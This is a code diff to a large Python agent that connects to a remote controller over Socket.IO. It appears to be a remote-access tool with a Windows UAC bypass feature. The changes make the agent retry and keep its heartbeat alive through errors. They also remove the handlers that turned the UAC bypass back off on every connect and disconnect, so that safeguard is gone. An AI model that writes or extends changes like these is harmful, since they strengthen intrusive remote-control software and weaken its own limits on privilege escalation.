@@ -1021,6 +1021,7 @@ def start_heartbeat():
     if HEARTBEAT_THREAD and HEARTBEAT_THREAD.is_alive():
         return
     def heartbeat_worker():
+        global HEARTBEAT_THREAD
         try:
             while sio and sio.connected:
                 try:
@@ -1030,7 +1031,7 @@ def start_heartbeat():
                     break
                 except Exception:
                     time.sleep(5)
-                    break
+                    continue
         finally:
             HEARTBEAT_THREAD = None
     HEARTBEAT_THREAD = threading.Thread(target=heartbeat_worker, daemon=True)
@@ -10011,24 +10012,6 @@ def register_socketio_handlers():
     sio.on('set_audio_volumes')(on_set_audio_volumes)
     sio.on('toggle_noise_reduction')(on_toggle_noise_reduction)
     sio.on('toggle_echo_cancellation')(on_toggle_echo_cancellation)
-    def on_connect(_data=None):
-        try:
-            global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
-            UAC_BYPASS_ALLOWED = False
-            DISABLE_UAC_BYPASS = True
-            log_message("UAC bypass gate reset on connect")
-        except Exception:
-            pass
-    def on_disconnect(_data=None):
-        try:
-            global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
-            UAC_BYPASS_ALLOWED = False
-            DISABLE_UAC_BYPASS = True
-            log_message("UAC bypass gate reset on disconnect")
-        except Exception:
-            pass
-    sio.on('connect')(on_connect)
-    sio.on('disconnect')(on_disconnect)
     
     log_message("Socket.IO event handlers registered successfully", "info")
 
@@ -16099,6 +16082,8 @@ def agent_main():
                     except Exception as e:
                         log_message(f"[WARN] Controller may not be reachable: {e}")
                         log_message(f"[INFO] Will retry in {retry_delay} seconds...")
+                        time.sleep(retry_delay)
+                        continue
             
                 sio.connect(SERVER_URL, transports=['websocket', 'polling'], wait_timeout=10)
                 log_message("[OK] Connected to server successfully!")
@@ -16184,30 +16169,10 @@ def agent_main():
                 except Exception as reg_error:
                     log_message(f"[WARN] Failed to register agent: {reg_error}")
                 
-                # Start heartbeat to keep agent visible
-                def heartbeat_worker():
-                    try:
-                        while sio and sio.connected:
-                            try:
-                                safe_emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})  # ✅ SAFE
-                                time.sleep(30)  # Send heartbeat every 30 seconds
-                            except KeyboardInterrupt:
-                                log_message("Heartbeat worker interrupted")
-                                break
-                            except Exception as e:
-                                error_msg = str(e)
-                                # Silence connection errors
-                                if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
-                                    log_message(f"Heartbeat error: {e}", "warning")
-                                time.sleep(5)
-                                break
-                    except KeyboardInterrupt:
-                        log_message("Heartbeat worker interrupted")
-                    log_message("Heartbeat worker stopped")
-                
-                heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
-                heartbeat_thread.start()
-                log_message("[OK] Heartbeat started")
+                try:
+                    start_heartbeat()
+                except Exception:
+                    pass
                 
                 # Keep connection alive and wait for events
                 sio.wait()
